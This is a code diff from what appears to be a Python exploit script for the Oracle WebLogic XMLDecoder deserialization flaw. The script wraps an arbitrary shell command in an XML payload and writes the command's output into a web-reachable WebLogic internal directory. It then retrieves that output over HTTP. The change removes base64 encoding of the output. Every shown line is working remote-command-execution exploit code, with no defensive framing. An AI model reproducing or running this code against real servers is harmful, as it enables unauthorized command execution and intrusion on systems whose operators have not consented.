@@ -27,7 +27,7 @@ def payload_command(command_in,output_file):
     }
     #命令执行回显：将命令执行的结果输出到文件中
     #command_in_payload = 'find . -name index.html| while read path_file;do {} >$(dirname $path_file)/{};done'.format(command_in,output_file)
-    command_in_payload = '{} |base64 > ./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}'.format(command_in,output_file)
+    command_in_payload = '{} > ./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}'.format(command_in,output_file)
     command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in_payload)+"</string>"
     #XMLDecoder反序列化payload:
 
@@ -65,7 +65,7 @@ def get_output(target,output_file):
     try:
         r = requests.get(output_url,headers = headers,proxies=proxies,timeout=timeout)
         if r.status_code == requests.codes.ok:
-            return (True,base64.b64decode(r.text.strip()))
+            return (True,(r.text.strip()))
         else:
             return (False,r.status_code)
     except Exception,ex:
